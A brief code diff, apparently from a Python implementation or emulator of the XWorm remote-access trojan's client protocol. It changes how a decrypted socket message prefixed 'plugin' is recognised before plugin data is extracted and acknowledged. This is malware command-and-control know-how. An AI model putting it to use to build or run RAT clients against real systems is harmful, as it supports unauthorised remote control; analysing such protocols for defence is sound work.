@@ -206,7 +206,7 @@ class Receive:
 
                 decrypted = ReceiveUtils.aes_decryptor(encrypted_payload, key).decode(errors="ignore") # Decrypt the payload
 
-                if "plugin" in decrypted: # Handle plugin data
+                if decrypted.startswith(f"plugin{Receive.SPL_XCLIENT}"): # Handle plugin data
                     plugin_data = decrypted.split("<Xwormmm>", 1)[-1] # Extract plugin data
                     ReceiveUtils.send_encrypted(sock, f"sendPlugin{Receive.SPL_XCLIENT}{plugin_data}", key) # Acknowledge plugin receipt
 
